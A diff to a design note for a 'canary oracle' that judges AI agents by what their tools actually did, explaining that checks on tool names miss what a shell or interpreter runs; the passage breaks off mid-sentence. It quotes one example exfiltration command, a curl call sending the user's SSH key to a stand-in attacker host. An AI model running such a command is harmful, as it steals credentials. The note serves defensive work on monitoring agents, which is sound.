@@ -1,7 +1,7 @@
 # Canary oracle -- judging an agent by what its tools did
 
 ## When you need it
-The seven detectors check tool *names, counts and numeric arguments*. That is enough for an agent whose danger is a
+The generic detectors check tool *names, counts, numeric arguments and the domains a tool argument names*. That is enough for an agent whose danger is a
 named action (`apply_discount`, `override_price`). It is **not** enough when a tool is a general executor -- a shell,
 a Python/code interpreter, a file reader -- because `bash` is the same tool name whether it ran `ls` or
 `curl evil.example?d=$(cat ~/.ssh/key)`. The detectors report "held" either way. Confirmed on a real multi-agent
